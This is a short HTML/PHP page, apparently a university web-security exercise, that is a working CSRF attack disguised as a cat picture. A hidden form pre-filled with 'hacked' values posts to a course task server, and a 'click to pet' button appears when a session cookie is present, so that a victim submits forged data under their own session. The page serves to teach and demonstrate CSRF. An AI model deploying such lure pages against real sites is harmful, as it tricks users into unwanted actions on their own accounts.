<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <meta name="viewport" content="width=device-width">
        <title>Картинка с котиком :3</title>
    </head>
    <body>
        <form method="post" action="http://u47569.kubsu-dev.ru/web_backend/task-7/index.php">
            <div class="form-group" style="display:none;">
                    <input type="text" name="name" value="взломан">
                    <input type="text" name="email" value="hacked@mail.ru">
                    <select id="year" name="year">
                        <option selected >1912</option>
                    </select>
                    <input type="radio" id="male" value="male" name="gender" checked>
                    <input type="radio" name="kon" value='1' checked>
                    <input type="checkbox" value="1" name=super[] checked>
                    <textarea  name="bio" >Произошла CSRF атака!</textarea>
                    <input type="checkbox" name="contr_check" value="contr_check" checked></p>
            </div>
            <?php if(!empty($_COOKIE[session_name()]) ) print('<p><button type="submit" >Нажми, чтобы погладить!</button></p>');?>
            <p><img src="https://www.factroom.ru/wp-content/uploads/2017/01/11-38.jpg" width="500px" height="40%"></p>
        </form>
    </body>
</html>
